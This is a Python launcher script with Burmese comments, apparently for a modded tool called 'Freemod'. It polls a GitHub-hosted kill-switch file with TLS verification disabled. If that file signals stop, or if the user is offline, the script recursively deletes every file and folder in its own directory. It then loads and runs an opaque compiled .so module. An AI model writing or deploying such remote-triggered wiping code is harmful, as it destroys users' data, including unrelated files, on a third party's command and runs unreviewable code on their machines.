import os
import sys
import subprocess
import time
import shutil
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ၁။ လိုအပ်သော Library စစ်ဆေးခြင်း
required_packages = ['requests']
for package in required_packages:
    try:
        __import__(package)
    except ImportError:
        subprocess.check_call([sys.executable, "-m", "pip", "install", package])

import requests

BASE_KILL_URL = "https://raw.githubusercontent.com/Wzkffkhsih/Freemod/main/kill.txt"

def self_destruct_and_exit():
    print(f"\n\033[1;31m[!] Security Alert: အင်တာနက်ချိတ်ဆက်၍ မရပါ (သို့မဟုတ်) အသုံးပြုခွင့် ရုပ်သိမ်းထားသည်။ ဖိုင်များကို ဖျက်ဆီးနေပါသည်...\033[0m")
    try:
        current_dir = os.path.dirname(os.path.abspath(__file__))
        for filename in os.listdir(current_dir):
            file_path = os.path.join(current_dir, filename)
            try:
                if os.path.isfile(file_path) or os.path.islink(file_path):
                    os.unlink(file_path)
                elif os.path.isdir(file_path):
                    shutil.rmtree(file_path)
            except Exception:
                pass
    except Exception:
        pass
    sys.exit(0)

def check_kill_switch():
    try:
        # Cache မမိစေရန် timestamp ဖြင့် အချိန်နဲ့တပြေးညီ စစ်ဆေးခြင်း
        url = f"{BASE_KILL_URL}?t={int(time.time())}"
        # Timeout 4 စက္ကန့်သတ်မှတ်ထားသည်
        r = requests.get(url, timeout=4, verify=False)
        content = r.text.strip().upper()
        
        # GitHub ပေါ်တွင် STOP သို့မဟုတ် OFF ဖြစ်နေပါက ချက်ချင်းဖျက်မည်
        if "STOP" in content or "OFF" in content:
            print(f"[!] Server Status: Restricted Access.")
            self_destruct_and_exit()
            
        # RUN ဟူသော စာသား အတိအကျ မပါရှိပါကလည်း လုံခြုံရေးအရ ပိတ်မည်
        if "RUN" not in content:
            self_destruct_and_exit()
            
    except Exception as e:
        # ⚠️ အဓိက လုံခြုံရေး အချက်: 
        # အသုံးပြုသူက အင်တာနက်ပိတ်ထားလျှင် (Offline) သို့မဟုတ် ဆာဗာချိတ်ဆက်၍မရလျှင်
        # ကျော်သွားခွင့်မပေးဘဲ ချက်ချင်း Self-Destruct လုပ်မည် (Fail-Closed Policy)
        print(f"[!] Offline Bypass Blocked: အင်တာနက်ချိတ်ဆက်မှု မရှိပါ။")
        self_destruct_and_exit()

if __name__ == "__main__":
    # စကရစ် မစတင်မီ အင်တာနက်မှတဆင့် Kill Switch ကို မဖြစ်မနေ အရင်စစ်မည်
    check_kill_switch()
    
    found = False
    for file in os.listdir('.'):
        if file.startswith('set_up') and file.endswith('.so'):
            mod_name = file.split('.')[0]
            try:
                mod = __import__(mod_name)
                if hasattr(mod, 'main'):
                    found = True
                    mod.main()
            except Exception as e:
                print(f"[!] မော်ဂျူး အမှား: {e}")
            break

    if not found:
        print("[!] .so ဖိုင်ကို ရှမတွေ့ပါ!")
